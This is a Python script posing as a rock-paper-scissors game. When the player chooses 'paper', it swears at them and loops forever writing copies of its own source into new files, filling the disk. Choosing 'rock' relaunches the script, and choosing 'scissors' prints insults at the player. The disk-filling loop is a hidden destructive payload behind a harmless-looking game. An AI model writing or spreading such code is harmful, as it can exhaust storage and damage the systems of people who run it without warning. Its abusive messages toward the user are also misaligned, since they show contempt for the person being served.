import random
import subprocess
from sys import argv
import time
import os


one = input("rock paper or scissors?: ")
time.sleep(0.5)
list = ['rock', 'paper', 'scissors']

two = ('I choose ', random.choice(list))
print(two)
time.sleep(1)


if one == ("paper"):
	print(".")
	time.sleep(1)
	print("..")
	time.sleep(1)
	print("...")
	time.sleep(1)
	print("fuck you")
	indicator = 0
	
	while True:
		with open("IHATEYOU{0}".format(indicator), "w") as f:
			f.write(open(__file__).read())
			f.close()
			indicator += 1

elif one == ("rock"):
	print("ok fine go again")
	os.system("python3 rps.py")



elif one == ("scissors"):
	print("""

YOUR SO BAD

ITS LITERALLY UNBELIEVABLE

HOLY CRAP MAN IM SO MUCH MORE INTELLIGENT THAN YOU

""")
